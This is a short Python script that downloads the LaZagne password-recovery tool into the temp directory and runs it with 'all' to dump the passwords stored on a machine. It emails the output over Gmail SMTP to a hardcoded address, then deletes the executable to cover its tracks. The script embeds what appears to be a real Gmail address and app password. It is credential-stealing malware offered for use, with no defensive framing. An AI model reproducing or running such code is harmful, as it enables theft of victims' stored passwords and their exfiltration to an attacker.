#!usr/bin/env python3
import tempfile

# TODO add parser add lazagne and msg of warning of to add its path as arg
import requests
import smtplib
import subprocess
import re, os, tempfile

def send_mail(email,password,msg):
    # using google public mail server
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()

def download(url):
    get_response=requests.get(url)
    # get the file name from the url
    file_name=url.split("/")[-1]

    # wb for writing a bin file
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

# get path to temp dir
tem_dir=tempfile.gettempdir()

# change current dir to temp dir
os.chdir(tem_dir)

# link to the laZagne file hosted on server
download("")

command = "laZagne.exe all"

# exec command
result = subprocess.check_output(command, shell=True)
send_mail("adytzuady982@gmail.com", "ljke ftdh igcw xckr",result )
# delete the downloaded file
os.remove("laZagne.exe" )